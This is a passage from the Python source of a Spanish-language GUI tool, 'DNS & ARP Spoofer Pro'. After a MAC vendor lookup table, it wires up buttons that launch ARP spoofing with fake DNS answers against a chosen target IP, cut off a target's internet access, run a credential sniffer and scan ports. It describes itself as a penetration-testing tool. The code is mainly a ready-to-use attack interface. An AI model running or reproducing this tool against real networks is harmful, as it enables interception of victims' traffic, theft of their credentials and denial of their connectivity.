            "C0:CE:CD": "Apple",
            "C0:D0:12": "Apple",
            "C0:F2:FB": "Apple",
            "C4:2C:03": "Apple",
            "C4:84:66": "Apple",
            "C4:84:66": "Apple",
            "C4:8E:8F": "Apple",
            "C4:9D:ED": "Apple",
            "C4:B3:01": "Apple",
            "C8:1E:E7": "Apple",
            "C8:2A:14": "Apple",
            "C8:33:4B": "Apple",
            "C8:3C:85": "Apple",
            "C8:69:CD": "Apple",
            "C8:6F:1D": "Apple",
            "C8:85:50": "Apple",
            "C8:9F:1D": "Apple",
            "C8:B5:B7": "Apple",
            "C8:BC:C8": "Apple",
            "C8:D0:83": "Apple",
            "C8:E0:EB": "Apple",
            "CC:08:8D": "Apple",
            "CC:08:E0": "Apple",
            "CC:20:E8": "Apple",
            "CC:25:EF": "Apple",
            "CC:29:F5": "Apple",
            "CC:44:63": "Apple",
            "CC:78:5F": "Apple",
            "CC:C7:60": "Apple",
            "D0:03:4B": "Apple",
            "D0:23:DB": "Apple",
            "D0:25:98": "Apple",
            "D0:33:11": "Apple",
            "D0:81:7A": "Apple",
            "D0:A6:37": "Apple",
            "D0:E1:40": "Apple",
            "D4:61:9D": "Apple",
            "D4:61:FE": "Apple",
            "D4:9A:20": "Apple",
            "D4:9C:28": "Apple",
            "D4:9C:28": "Apple",
            "D8:00:4D": "Apple",
            "D8:1D:72": "Apple",
            "D8:30:62": "Apple",
            "D8:96:95": "Apple",
            "D8:9E:3F": "Apple",
            "D8:A2:5E": "Apple",
            "D8:BB:2C": "Apple",
            "D8:CF:9C": "Apple",
            "D8:D1:CB": "Apple",
            "DC:2B:2A": "Apple",
            "DC:2B:61": "Apple",
            "DC:37:14": "Apple",
            "DC:41:5F": "Apple",
            "DC:56:E7": "Apple",
            "DC:86:D8": "Apple",
            "DC:9B:9C": "Apple",
            "DC:A4:CA": "Apple",
            "DC:C0:DB": "Apple",
            "E0:33:8E": "Apple",
            "E0:66:78": "Apple",
            "E0:AC:CB": "Apple",
            "E0:B9:BA": "Apple",
            "E0:C9:7A": "Apple",
            "E0:F5:C6": "Apple",
            "E0:F8:47": "Apple",
            "E4:25:E7": "Apple",
            "E4:8B:7F": "Apple",
            "E4:98:D6": "Apple",
            "E4:9A:79": "Apple",
            "E4:C6:3D": "Apple",
            "E4:CE:8F": "Apple",
            "E8:04:0B": "Apple",
            "E8:06:88": "Apple",
            "E8:2A:EA": "Apple",
            "E8:4E:06": "Apple",
            "E8:80:2E": "Apple",
            "E8:8D:28": "Apple",
            "E8:B2:AC": "Apple",
            "E8:BB:3D": "Apple",
            "EC:35:86": "Apple",
            "EC:85:2F": "Apple",
            "EC:AD:B8": "Apple",
            "F0:18:98": "Apple",
            "F0:24:75": "Apple",
            "F0:76:6F": "Apple",
            "F0:79:60": "Apple",
            "F0:99:BF": "Apple",
            "F0:B0:E7": "Apple",
            "F0:B4:79": "Apple",
            "F0:C1:F1": "Apple",
            "F0:CB:A1": "Apple",
            "F0:D1:A9": "Apple",
            "F0:DB:E2": "Apple",
            "F0:DB:F8": "Apple",
            "F0:F6:1C": "Apple",
            "F4:0F:24": "Apple",
            "F4:1B:A1": "Apple",
            "F4:31:C3": "Apple",
            "F4:37:B7": "Apple",
            "F4:5C:89": "Apple",
            "F4:F1:5A": "Apple",
            "F4:F9:51": "Apple",
            "F8:03:77": "Apple",
            "F8:1E:DF": "Apple",
            "F8:27:93": "Apple",
            "F8:4F:57": "Apple",
            "F8:95:EA": "Apple",
            "F8:9F:B8": "Apple",
            "F8:FF:C2": "Apple",
            "FC:25:3F": "Apple",
            "FC:D8:48": "Apple",
            "FC:FC:48": "Apple"
        }
        
        return vendors.get(mac_prefix, "Desconocido")

    def start_attack(self):
        target_ip = self.target_entry.get().strip()
        domains_input = self.domain_entry.get().strip()
        
        if not target_ip or not domains_input:
            messagebox.showerror("Error", "Debe especificar una IP objetivo y dominios")
            return
        
        if not NetworkUtils.validate_ip(target_ip):
            messagebox.showerror("Error", "La IP objetivo no es válida")
            return
        
        state.target_ip = target_ip
        state.attacker_ip = NetworkUtils.get_local_ip()
        state.gateway_ip = NetworkUtils.get_gateway()
        
        if not state.gateway_ip:
            messagebox.showerror("Error", "No se pudo determinar el gateway")
            return
        
        state.target_mac = NetworkUtils.get_mac(state.target_ip)
        state.gateway_mac = NetworkUtils.get_mac(state.gateway_ip)
        
        if not state.target_mac or not state.gateway_mac:
            messagebox.showerror("Error", "No se pudieron obtener las direcciones MAC")
            return
        
        state.fake_domains = {}
        for domain in domains_input.split(","):
            domain = domain.strip().lower()
            if domain:
                if not domain.endswith("."):
                    domain += "."
                state.fake_domains[domain] = state.attacker_ip
        
        SecurityUtils.enable_ip_forwarding()
        
        state.sniffing_active = True
        state.status = "attacking"
        state.packet_count = 0
        state.start_time = datetime.now()
        
        self.state_label.config(text="Atacando...")
        self.status_label.config(text="Atacando", foreground="#0f0")
        
        threading.Thread(target=advanced_arp_spoof, daemon=True).start()
        threading.Thread(target=start_sniffing, daemon=True).start()
        
        self.print_output(f"[+] Ataque iniciado contra {state.target_ip}")
        self.print_output(f"    Gateway: {state.gateway_ip}")
        self.print_output(f"    Atacante: {state.attacker_ip}")
        self.print_output(f"    Dominios falsos: {', '.join(state.fake_domains.keys())}")

    def block_internet(self):
        target_ip = self.target_entry.get().strip()
        
        if not target_ip:
            messagebox.showerror("Error", "Debe especificar una IP objetivo")
            return
        
        if not NetworkUtils.validate_ip(target_ip):
            messagebox.showerror("Error", "La IP objetivo no es válida")
            return
        
        state.target_ip = target_ip
        state.gateway_ip = NetworkUtils.get_gateway()
        state.target_mac = NetworkUtils.get_mac(state.target_ip)
        state.gateway_mac = NetworkUtils.get_mac(state.gateway_ip)
        
        if not state.target_mac or not state.gateway_mac:
            messagebox.showerror("Error", "No se pudieron obtener las direcciones MAC")
            return
        
        SecurityUtils.disable_ip_forwarding()
        
        state.sniffing_active = True
        state.status = "blocking"
        state.packet_count = 0
        state.start_time = datetime.now()
        
        self.state_label.config(text="Bloqueando...")
        self.status_label.config(text="Bloqueando", foreground="#f00")
        
        threading.Thread(target=block_internet, daemon=True).start()
        
        self.print_output(f"[!] Internet bloqueado para {state.target_ip}")

    def stop_attack(self):
        state.sniffing_active = False
        state.status = "ready"
        
        if state.auto_restore:
            restore_arp()
            SecurityUtils.disable_ip_forwarding()
        
        self.state_label.config(text="Inactivo")
        self.status_label.config(text="Listo", foreground="#0f0")
        self.print_output("[*] Todos los ataques detenidos")

    def toggle_protection(self):
        state.protection_active = not state.protection_active
        
        if state.protection_active:
            self.protection_label.config(text="Protección: ON", foreground="#0f0")
            threading.Thread(target=SecurityUtils.arp_protection, daemon=True).start()
            self.print_output("[+] Protección ARP activada")
        else:
            self.protection_label.config(text="Protección: OFF", foreground="#f00")
            self.print_output("[+] Protección ARP desactivada")

    def start_credential_sniffer(self):
        if not state.credential_sniffer_active:
            state.credential_sniffer_active = True
            threading.Thread(target=credential_sniffer, daemon=True).start()
            self.print_output("[+] Sniffer de credenciales activado")
        else:
            self.print_output("[!] Sniffer de credenciales ya está activo")

    def open_port_scanner(self):
        port_win = Toplevel(self.root)
        port_win.title("Escáner de Puertos")
        port_win.geometry("400x200")
        
        ttk.Label(port_win, text="IP objetivo:").pack(pady=5)
        ip_entry = ttk.Entry(port_win)
        ip_entry.pack(pady=5)
        
        ttk.Label(port_win, text="Rango de puertos (ej. 1-1024):").pack(pady=5)
        port_entry = ttk.Entry(port_win)
        port_entry.pack(pady=5)
        port_entry.insert(0, "1-1024")
        
        def start_scan():
            target = ip_entry.get()
            ports = port_entry.get()
            
            if not NetworkUtils.validate_ip(target):
                messagebox.showerror("Error", "IP no válida")
                return
            
            if "-" not in ports or not all(p.isdigit() for p in ports.split("-")):
                messagebox.showerror("Error", "Rango de puertos no válido")
                return
            
            threading.Thread(target=lambda: port_scan(target, ports), daemon=True).start()
            port_win.destroy()
        
        ttk.Button(port_win, text="Escanear", command=start_scan).pack(pady=10)

    def open_network_analyzer(self):
        analyzer_win = Toplevel(self.root)
        analyzer_win.title("Analizador de Red")
        analyzer_win.geometry("600x400")
        
        notebook = ttk.Notebook(analyzer_win)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        conn_tab = ttk.Frame(notebook)
        notebook.add(conn_tab, text="Conexiones")
        
        conn_text = scrolledtext.ScrolledText(conn_tab, bg="#252525", fg="#0f0", font=("Consolas", 10))
        conn_text.pack(fill=tk.BOTH, expand=True)
        
        def get_connections():
            conn_text.delete(1.0, tk.END)
            
            try:
                if platform.system() == "Windows":
                    result = subprocess.check_output(["netstat", "-ano"], text=True)
                else:
                    result = subprocess.check_output(["netstat", "-tulnp"], text=True)
                
                conn_text.insert(tk.END, result)
            except Exception as e:
                conn_text.insert(tk.END, f"Error: {str(e)}")
        
        ttk.Button(conn_tab, text="Actualizar", command=get_connections).pack(pady=5)
        get_connections()
        
        info_tab = ttk.Frame(notebook)
        notebook.add(info_tab, text="Información")
        
        info_text = scrolledtext.ScrolledText(info_tab, bg="#252525", fg="#0f0", font=("Consolas", 10))
        info_text.pack(fill=tk.BOTH, expand=True)
        
        def get_network_info():
            info_text.delete(1.0, tk.END)
            
            try:
                local_ip = NetworkUtils.get_local_ip()
                gateway = NetworkUtils.get_gateway()
                
                info_text.insert(tk.END, f"IP Local: {local_ip}\n")
                info_text.insert(tk.END, f"Gateway: {gateway}\n")
                info_text.insert(tk.END, f"Interfaz: {state.interface}\n\n")
                
                if platform.system() == "Windows":
                    dns_info = subprocess.check_output(["ipconfig", "/all"], text=True)
                else:
                    dns_info = subprocess.check_output(["cat", "/etc/resolv.conf"], text=True)
                
                info_text.insert(tk.END, "Configuración DNS:\n")
                info_text.insert(tk.END, dns_info)
            except Exception as e:
                info_text.insert(tk.END, f"Error: {str(e)}")
        
        ttk.Button(info_tab, text="Actualizar", command=get_network_info).pack(pady=5)
        get_network_info()

    def toggle_auto_restore(self):
        state.auto_restore = not state.auto_restore
        self.print_output(f"[+] Auto-restaurar ARP {'activado' if state.auto_restore else 'desactivado'}")

    def toggle_dark_mode(self):
        state.dark_mode = not state.dark_mode
        self.print_output(f"[+] Proximamente, atentos al discord {'activado' if state.dark_mode else 'desactivado'}")

    def select_interface(self):
        interfaces = NetworkUtils.get_network_interfaces()
        
        if not interfaces:
            messagebox.showerror("Error", "No se encontraron interfaces de red")
            return
        
        interface_win = Toplevel(self.root)
        interface_win.title("Seleccionar Interfaz")
        interface_win.geometry("300x200")
        
        ttk.Label(interface_win, text="Seleccione la interfaz de red:").pack(pady=10)
        
        interface_var = tk.StringVar(value=state.interface)
        for iface in interfaces:
            ttk.Radiobutton(interface_win, text=iface, variable=interface_var, value=iface).pack(anchor="w")
        
        def save_interface():
            state.interface = interface_var.get()
            conf.iface = state.interface
            self.interface_label.config(text=f"Interfaz: {state.interface}")
            interface_win.destroy()
            self.print_output(f"[+] Interfaz cambiada a: {state.interface}")
        
        ttk.Button(interface_win, text="Aceptar", command=save_interface).pack(pady=10)

    def save_log(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")],
            title="Guardar registro"
        )
        
        if file_path:
            try:
                content = self.output_text.get(1.0, tk.END)
                with open(file_path, 'w') as f:
                    f.write(content)
                self.print_output(f"[+] Registro guardado en: {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"No se pudo guardar el archivo: {str(e)}")

    def load_config(self):
        file_path = filedialog.askopenfilename(
            filetypes=[("Config files", "*.cfg"), ("Text files", "*.txt"), ("All files", "*.*")],
            title="Cargar configuración"
        )
        
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        if line.startswith("target_ip="):
                            self.target_entry.delete(0, tk.END)
                            self.target_entry.insert(0, line.split("=")[1].strip())
                        elif line.startswith("domains="):
                            self.domain_entry.delete(0, tk.END)
                            self.domain_entry.insert(0, line.split("=")[1].strip())
                
                self.print_output(f"[+] Configuración cargada desde: {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"No se pudo cargar el archivo: {str(e)}")

    def save_config(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".cfg",
            filetypes=[("Config files", "*.cfg"), ("Text files", "*.txt"), ("All files", "*.*")],
            title="Guardar configuración"
        )
        
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(f"target_ip={self.target_entry.get()}\n")
                    f.write(f"domains={self.domain_entry.get()}\n")
                    f.write(f"interface={state.interface}\n")
                    f.write(f"auto_restore={state.auto_restore}\n")
                
                self.print_output(f"[+] Configuración guardada en: {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"No se pudo guardar el archivo: {str(e)}")

    def open_docs(self):
        webbrowser.open("https://github.com/M-Societyy/mspoffer")

    def show_about(self):
        about_win = Toplevel(self.root)
        about_win.title("Acerca de")
        about_win.geometry("400x300")
        
        ttk.Label(about_win, text=f"DNS & ARP Spoofer Pro", font=("Segoe UI", 14, "bold")).pack(pady=10)
        ttk.Label(about_win, text=f"Versión: {VERSION}").pack()
        ttk.Label(about_win, text=f"Desarrollado por: {AUTHOR}").pack()
        ttk.Label(about_win, text=f"Licencia: {LICENSE}").pack()
        ttk.Label(about_win, text=f"Fecha de lanzamiento: {RELEASE_DATE}").pack()
        
        ttk.Label(about_win, text="\nHerramienta avanzada para pruebas de penetración\nen redes locales mediante ARP y DNS spoofing.").pack(pady=10)
        
        ttk.Button(about_win, text="Cerrar", command=about_win.destroy).pack(pady=10)

    def safe_exit(self):
        if state.sniffing_active:
            if messagebox.askyesno("Confirmar", "Hay ataques activos. ¿Realmente desea salir?"):
                state.sniffing_active = False
                if state.auto_restore:
                    restore_arp()
                    SecurityUtils.disable_ip_forwarding()
                self.root.destroy()
        else:
            self.root.destroy()

class RedirectText:
    def __init__(self, text_widget):
        self.text_widget = text_widget
    
    def write(self, string):
        self.text_widget.config(state=tk.NORMAL)
        self.text_widget.insert(tk.END, string)
        self.text_widget.see(tk.END)
        self.text_widget.config(state=tk.DISABLED)
        
        if state.log_file:
            with open(state.log_file, 'a') as f:
                f.write(string)
    
    def flush(self):
        pass

if __name__ == "__main__":
    state.attacker_ip = NetworkUtils.get_local_ip()
    state.gateway_ip = NetworkUtils.get_gateway()
    state.interface = conf.iface
    
    root = tk.Tk()
    app = ModernUI(root)
    
    log_dir = os.path.join(os.path.expanduser("~"), "DNS_ARP_Spoofer_Pro_Logs")
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    state.log_file = log_file
    
    print(f"=== DNS & ARP Spoofer Pro v{VERSION} - {AUTHOR} ===")
    print(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"IP Local: {state.attacker_ip}")
    print(f"Gateway: {state.gateway_ip}")
    print(f"Interfaz: {state.interface}")
    print(f"Archivo de log: {log_file}")
    print("=" * 50)
    
    app.update_clock()
    
    root.mainloop()
    
    if state.sniffing_active and state.auto_restore:
        restore_arp()
        SecurityUtils.disable_ip_forwarding()
    
    print("[+] Aplicación cerrada correctamente")
